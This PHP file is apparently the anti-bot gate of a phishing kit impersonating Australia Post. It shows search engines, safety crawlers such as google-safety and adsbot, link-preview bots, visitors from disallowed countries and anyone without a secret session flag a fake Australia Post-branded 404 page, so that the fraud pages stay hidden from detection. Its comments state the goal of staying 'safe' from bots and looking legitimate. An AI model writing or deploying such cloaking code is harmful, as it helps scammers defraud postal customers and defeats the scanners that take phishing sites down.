<?php
// =============================================
// CENTRALIZED ANTIBOT CHECK 
// =============================================

/** 
 * REAL-LOOKING 404 PAGE: Search bots see this
 */
function showClean404()
{
    header("HTTP/1.1 404 Not Found");
    header("Content-Type: text/html; charset=utf-8");
    // Extra headers to look legitimate
    header("X-Robots-Tag: noindex, nofollow, noarchive");
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>404 – Page Not Found | Australia Post</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f4f6f8;color:#333;display:flex;flex-direction:column;min-height:100vh}.bar{height:6px;background:#dc1928}.header{background:#fff;padding:15px 20px;border-bottom:1px solid #eee}.header img{height:32px}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:12px;padding:40px 30px;max-width:450px;width:100%;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.05)}h1{font-size:72px;font-weight:800;color:#e0e0e0;margin-bottom:10px}h2{font-size:20px;font-weight:600;margin-bottom:12px;color:#222}p{color:#666;font-size:14px;line-height:1.6;margin-bottom:25px}a.btn{display:inline-block;background:#dc1928;color:#fff;padding:12px 30px;border-radius:6px;text-decoration:none;font-weight:600;font-size:14px;transition:.2s}a.btn:hover{background:#b8141e}.footer{background:#fff;padding:15px;text-align:center;font-size:11px;color:#999;border-top:1px solid #eee}</style></head><body><div class="bar"></div><div class="header"><img src="assets/POST.svg" alt="Australia Post"></div><div class="main"><div class="card"><h1>404</h1><h2>Page not found</h2><p>The page you are looking for does not exist or has been moved. Please check the URL or return to the homepage.</p><a href="https://auspost.com.au" class="btn">Go to auspost.com.au</a></div></div><div class="footer">&copy; ' . date('Y') . ' Australia Post – All rights reserved</div></body></html>';
    exit;
}

/** 
 * CHECK SEARCH ENGINES: Always shows 404 — DO NOT use die() here
 */
function checkSearchEngineBot()
{
    $agent_lower = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $visitor_ip = $_SERVER['REMOTE_ADDR'];

    // Comprehensive bot list
    $search_engine_bots = ['googlebot', 'bingbot', 'slurp', 'yandexbot', 'baiduspider', 'duckduckbot', 'applebot', 'petalbot', 'google-inspectiontool', 'google-safety', 'google-extended', 'adsbot-google', 'mediapartners-google', 'chrome-lighthouse', 'twitterbot', 'facebookexternalhit', 'facebot', 'linkedinbot', 'discordbot'];
    foreach ($search_engine_bots as $se_bot) {
        if (strpos($agent_lower, $se_bot) !== false) {
            showClean404();
        }
    }

    /* 
    // Reverse DNS check for major search engines - BOT DOMAINS ONLY
    // DISABLED: This check is too slow and causes 'white screen' for real users
    $hostname = @gethostbyaddr($visitor_ip);
    if ($hostname && $hostname !== $visitor_ip) {
        $search_hosts = ['googlebot.com', 'search.msn.com', 'crawl.yahoo.net', 'yandex.ru', 'yandex.net', 'baidu.com', 'applebot.apple.com'];
        foreach ($search_hosts as $sh) {
            if (substr(strtolower($hostname), -strlen($sh)) === $sh) {
                showClean404();
            }
        }
    }
    */
}

/**
 * Get visitor's country from IP geolocation
 */
function getCountryFromIP() {
    global $allowed_countries;

    // Get IP address
    $ip = '';
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = trim(explode(',', $_SERVER[$k])[0]);
            break;
        }
    }

    if (!$ip || $ip === 'N/A') return null;

    // Use ip-api.com for geolocation (free tier: 45 requests/min)
    $url = "http://ip-api.com/json/$ip?fields=countryCode";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        $data = json_decode($response, true);
        return $data['countryCode'] ?? null;
    }

    return null;
}

/**
 * Check if visitor is from allowed country
 */
function checkCountryRestriction() {
    global $allowed_countries;

    $country = getCountryFromIP();

    // If we can't determine country, allow (fail open - better UX than blocking)
    if (!$country) return true;

    // Check if country is in allowed list
    return in_array($country, $allowed_countries);
}

/**
 * Validate session chain.
 */
function validateSession($min_step = 1)
{
    // Hide server technology
    header_remove("X-Powered-By");
    header("X-Content-Type-Options: nosniff");
    header("X-Frame-Options: SAMEORIGIN");
    header("X-XSS-Protection: 1; mode=block");

    // 1. Search bots: Must see a 404 to stay safe
    checkSearchEngineBot();

    // 2. Country check: Block if not from allowed countries
    if (!checkCountryRestriction()) {
        showClean404();
    }

    // 3. Keymaster session check: Shows professional 404 for users/scanners
    if (!isset($_SESSION['qsdfqsdfqsdfqsdf123123']) || $_SESSION['qsdfqsdfqsdfqsdf123123'] !== true) {
        showClean404();
    }

    // 4. Chain order check: Shows 404 if accessed out of order
    if (!isset($_SESSION['STEP_CHAIN']) || $_SESSION['STEP_CHAIN'] < $min_step) {
        showClean404();
    }
}
?>
